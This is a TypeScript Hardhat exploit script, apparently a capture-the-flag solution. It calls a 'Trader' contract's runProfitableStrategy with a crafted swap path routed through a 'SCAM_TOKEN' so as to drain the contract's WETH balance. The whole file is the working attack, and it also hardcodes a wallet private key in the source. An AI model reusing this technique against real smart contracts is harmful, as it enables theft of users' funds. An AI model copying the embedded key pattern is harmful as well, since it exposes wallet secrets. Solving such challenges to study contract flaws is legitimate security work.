import { ethers } from 'hardhat'
import { BigNumber } from 'ethers'
import { ETH_RPC } from '../secrets.config'

import * as dotenv from 'dotenv'
import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'
import { Token__factory, Trader__factory} from '../typechain'
dotenv.config()

const instanceAddr = "0x600F370e537FBB6bb854938A7190883Ec16B9eBf"
const playerAddr = "0x666B99107032D52A3cf05DCB660F1C981973be23"

const WETH = "0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6"
const SCAM_TOKEN = "0x661BE46E1c3d14A696617CF9b365c792d102249c"
const TOKEN = "0x051aD9e6A07Ac9ef5bB6410B4D24B4cD26AF6cb3"

const providerETH = new ethers.providers.JsonRpcProvider(ETH_RPC)

async function hack() {
  const signer = new ethers.Wallet("1d601a181721b4ee6e2c40ea05ff6b53e4efc35f584c39c5e004cc8a328c5c45", providerETH);
  const instanceContract = Trader__factory.connect(instanceAddr, signer)

  const swapRouter = await instanceContract.swapRouter()
  const quoter = await instanceContract.quoter()
  console.log("swapRouter:", swapRouter);
  console.log("quoter:", quoter);
  
  const wethContract = Token__factory.connect(WETH, providerETH)
  const wethBalance = await wethContract.balanceOf(instanceAddr)
  console.log("WETH balance:", wethBalance.toString());
  
  const packedBytes = ethers.utils.solidityPack(["address", "uint24", "address", "uint24", "address", "uint24", "address"], [WETH, 500, SCAM_TOKEN, 500, TOKEN, 500, WETH])

  await (await instanceContract.runProfitableStrategy(packedBytes, wethBalance)).wait()

  console.log("WETH balance:", await wethContract.balanceOf(instanceAddr));
}

hack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })